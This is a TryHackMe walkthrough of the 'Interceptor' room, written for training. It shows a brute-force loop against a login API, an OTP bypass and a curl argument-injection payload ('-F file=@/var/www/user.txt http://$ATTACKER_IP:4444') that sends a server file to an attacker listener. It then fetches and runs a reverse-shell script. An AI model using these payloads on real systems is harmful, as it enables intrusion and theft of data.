@@ -1,0 +1,156 @@
+---
+title: 'Interceptor'
+description: 'A leaked .bak file exposes a predictable admin password; brute-forcing it plus an OTP bypass reaches the admin panel, where an Import Feed feature passes input to curl and a blacklist that only strips ;&| is defeated by curl argument injection to read files and get a www-data shell.'
+date: 2026-06-25
+platform: tryhackme
+room: 'Interceptor'
+roomUrl: 'https://tryhackme.com/room/interceptor'
+difficulty: medium
+tags:
+  - 'web'
+  - 'php'
+  - 'command-injection'
+  - 'linux'
+vulnClasses:
+  - 'world-readable secret file'
+  - 'weak credentials'
+  - 'authentication bypass'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Interceptor" room from TryHackMe (MediaHub). A forgotten_ _`.bak`_ _file leaks the source of the login page and a developer note about the admin password format; we brute-force it, slip past the OTP step, and reach an admin “Import Feed” feature that pipes our input into_ _`curl`\*\*. Its blacklist only strips_ _`;`\*\*,_ _`&`_ _and_ _`|`\*\*, so we use curl_ **_argument injection_** _to read local files and land a shell as www-data._
+
+> Interceptor is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. The flags and the admin password are shown as `THM{<redacted>}` / `<redacted>` — real on the box, withheld here. This writeup documents the chain exactly as performed: it ends at the www-data foothold and the user flag; no root privilege-escalation step was carried out.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+MediaHub (vhost `intercept.thm`) sets `PHPSESSID` without `HttpOnly`; content discovery finds a **`login.php.bak`** backup that serves PHP as plaintext, leaking a dev note: admin is `admin@mediahub.thm` and the password is **`MediaHub`** **+ a year** → brute the `api_login.php` endpoint and a recent year works → the login then demands an **OTP**, which is bypassed with Burp → the admin panel’s **Import Feed** runs `curl -s <url>` and its filter only removes `;&|` → use **curl argument injection** (`-F file=@/var/www/user.txt`) to exfiltrate local files and then fetch a reverse shell → **shell as www-data** and the user flag.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` shows SSH, a DNS server, and an Apache site (MediaHub) whose session cookie is missing `HttpOnly`:
+
+```text
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+53/tcp open  domain  ISC BIND 9.16.1
+80/tcp open  http    Apache httpd 2.4.41   # MediaHub  (PHPSESSID: httponly flag not set)
+```
+
+Work against the vhost `intercept.thm`. Content discovery is noisy but productive:
+
+```text
+gobuster dir -u http://intercept.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php --exclude-length=1491
+# config.php  dashboard.php(->login)  login.php  otp.php  search.php  phpmyadmin/  uploads/
+ffuf -u http://intercept.thm/login.php.FUZZ -w <(echo -e "bak\nold\ntxt\nswp") -fs 1491
+# bak  [Status: 200]
+```
+
+### **The vulnerability**
+
+The `login.php.bak` backup is served as plaintext (Apache only _executes_ `.php`), exposing the source and, crucially, a developer comment:
+
+```text
+# Admin test account for staging environment
+# Email: admin@mediahub.thm
+# Admin password follows company format: MediaHub + any year
+```
+
+That hands us the username and a tiny keyspace for the password. After login, an OTP gate stands in the way, and once inside, the admin **Import Feed** tool fetches a user-supplied URL with `curl` behind a weak blacklist.
+
+<Callout type="insight">
+
+The client-side filter is `url.replace(/[;&|]/g, '')` — it only kills the command-chaining characters. But the backend runs roughly `shell_exec("curl -s " + url)`, so you don’t need to _chain_ a new command: just inject extra **curl arguments**. `curl` happily takes multiple URLs and flags, so `-F file=@/var/www/user.txt http://$ATTACKER_IP:4444` makes the server read a local file and POST it to you. Argument injection sails straight past a blacklist built only for `;`, `&` and `|`.
+
+</Callout>
+
+### **Step 1 — brute the predictable admin password**
+
+We spray `MediaHub<year>` at the JSON login API; a recent year returns success and triggers the OTP step:
+
+```text
+for y in $(seq 2000 2026); do
+  echo -n "$y "
+  curl -s -X POST "http://intercept.thm/api_login.php" \
+    -F 'email=admin@mediahub.thm' -F "password=MediaHub$y"
+  echo
+done
+# ...
+# <redacted year> {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
+```
+
+### **Step 2 — bypass the OTP and reach the admin panel**
+
+The second-factor step is enforced client-side/loosely, and is bypassed by manipulating the request in Burp to proceed straight to the authenticated dashboard. The admin view even ships the first flag in a tooltip attribute:
+
+```text
+<h4 ... title="Flag: THM{<redacted>}">Import Feed</h4>
+```
+
+### **Step 3 — curl argument injection → read files → www-data shell (user flag)**
+
+The Import Feed field feeds `curl -s <url>`. Instead of chaining (the `;&|` are stripped), we inject curl flags to upload a local file to our listener:
+
+```text
+# payload submitted into the feed URL field:
+http://example.com/ -F file=@/var/www/user.txt http://$ATTACKER_IP:4444
+
+# attacker
+nc -lvnp 4444
+# POST / ... multipart/form-data ...
+# filename="user.txt"
+# THM{<redacted>}
+```
+
+The same argument injection is then used to fetch and run a reverse-shell script, giving an interactive foothold as the web user:
+
+```text
+python3 -m http.server 8000   # serving shell.sh
+nc -lvnp 4444
+# www-data@interceptor:/var/www/html$ cd /var/www && cat user.txt
+# THM{<redacted>}
+```
+
+### **Where this stops**
+
+At this point we hold a shell as **www-data** and the user flag. This writeup documents only what was performed — a local privilege-escalation path to root was not completed here, so none is claimed. Enumerating SUID binaries, `sudo -l`, cron jobs, and the local MySQL/phpMyAdmin instance is the natural next step toward root.
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 \~8.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L`). A world-readable backup file discloses source and a predictable admin credential; combined with a weak OTP gate, that yields full admin access with no real secret. The admin Import Feed feature then allows curl argument injection — arbitrary local file read and remote code execution as the web user — exposing application data and giving an interactive foothold on the host.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Remove editor/backup files from the web root** and configure the server to deny `.bak`/`.old`/`.swp`; never ship source with credentials in comments.
+- **Enforce strong, non-formulaic passwords.** “`MediaHub` + year” is a 27-entry keyspace.
+- **Validate the OTP server-side** and bind it to the session; a second factor that can be skipped in the request is no factor at all.
+- **Don’t build shell commands from user input.** Blacklisting `;&|` misses argument injection entirely — use a real HTTP client with a fixed argument list, validate the URL, and never pass it to a shell.
+
+</Callout>
+
+### **Takeaways**
+
+- **Always fuzz for backup extensions.** One `.bak` turned the login page into a credential leak.
+- **A formula is not a password.** A documented naming scheme collapses the keyspace to nothing.
+- **Argument injection ≠ command injection.** Filtering `;`, `&`, `|` does nothing when the attacker just adds flags to the existing command — `curl -F @file` is a file-read primitive.
+- **Document only what you did.** The chain here ends at a www-data foothold; root remains future work.
+
+Interceptor is a sharp reminder that the dangerous part of a “safe” command can be its own arguments. Thanks for reading.
